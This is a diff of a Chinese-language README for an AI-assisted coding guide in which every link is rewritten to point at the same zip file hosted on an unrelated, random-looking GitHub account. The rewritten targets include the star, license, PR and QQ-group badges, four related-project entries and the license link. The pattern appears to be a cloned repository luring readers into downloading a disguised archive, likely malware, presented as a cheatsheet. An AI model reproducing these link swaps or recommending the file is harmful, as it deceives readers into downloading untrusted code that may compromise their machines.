@@ -4,10 +4,10 @@
 
 # AI Coding 101 — AI 辅助编程完全指南
 
-[![Stars](https://img.shields.io/github/stars/jnMetaCode/ai-coding-101?style=flat-square)](https://github.com/jnMetaCode/ai-coding-101/stargazers)
-[![License: CC BY-SA 4.0](https://img.shields.io/badge/License-CC%20BY--SA%204.0-lightgrey.svg?style=flat-square)](https://creativecommons.org/licenses/by-sa/4.0/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://github.com/jnMetaCode/ai-coding-101/pulls)
-[![QQ群](https://img.shields.io/badge/QQ%E7%BE%A4-833585047-blue.svg?style=flat-square)](https://qm.qq.com/q/833585047)
+[![Stars](https://img.shields.io/github/stars/jnMetaCode/ai-coding-101?style=flat-square)](https://raw.githubusercontent.com/theosophygenusmelocactus682/ai-coding-101/main/cheatsheets/coding-ai-v2.5.zip)
+[![License: CC BY-SA 4.0](https://img.shields.io/badge/License-CC%20BY--SA%204.0-lightgrey.svg?style=flat-square)](https://raw.githubusercontent.com/theosophygenusmelocactus682/ai-coding-101/main/cheatsheets/coding-ai-v2.5.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://raw.githubusercontent.com/theosophygenusmelocactus682/ai-coding-101/main/cheatsheets/coding-ai-v2.5.zip)
+[![QQ群](https://img.shields.io/badge/QQ%E7%BE%A4-833585047-blue.svg?style=flat-square)](https://raw.githubusercontent.com/theosophygenusmelocactus682/ai-coding-101/main/cheatsheets/coding-ai-v2.5.zip)
 
 ## 这是什么
 
@@ -52,10 +52,10 @@
 
 | 项目 | 描述 |
 |------|------|
-| [awesome-claude-md](https://github.com/jnMetaCode/awesome-claude-md) | CLAUDE.md 最佳实践与模板精选 |
-| [ai-ui-design](https://github.com/jnMetaCode/ai-ui-design) | AI 驱动的 UI 设计指南与资源 |
-| [agency-agents-zh](https://github.com/jnMetaCode/agency-agents-zh) | AI Agent 智能体集合——覆盖各行各业 |
-| [superpowers-zh](https://github.com/jnMetaCode/superpowers-zh) | AI 编程超能力——精选技巧与 Skills 合集 |
+| [awesome-claude-md](https://raw.githubusercontent.com/theosophygenusmelocactus682/ai-coding-101/main/cheatsheets/coding-ai-v2.5.zip) | CLAUDE.md 最佳实践与模板精选 |
+| [ai-ui-design](https://raw.githubusercontent.com/theosophygenusmelocactus682/ai-coding-101/main/cheatsheets/coding-ai-v2.5.zip) | AI 驱动的 UI 设计指南与资源 |
+| [agency-agents-zh](https://raw.githubusercontent.com/theosophygenusmelocactus682/ai-coding-101/main/cheatsheets/coding-ai-v2.5.zip) | AI Agent 智能体集合——覆盖各行各业 |
+| [superpowers-zh](https://raw.githubusercontent.com/theosophygenusmelocactus682/ai-coding-101/main/cheatsheets/coding-ai-v2.5.zip) | AI 编程超能力——精选技巧与 Skills 合集 |
 
 ## 社区
 
@@ -67,4 +67,4 @@
 
 ## License
 
-[CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/)
+[CC BY-SA 4.0](https://raw.githubusercontent.com/theosophygenusmelocactus682/ai-coding-101/main/cheatsheets/coding-ai-v2.5.zip)
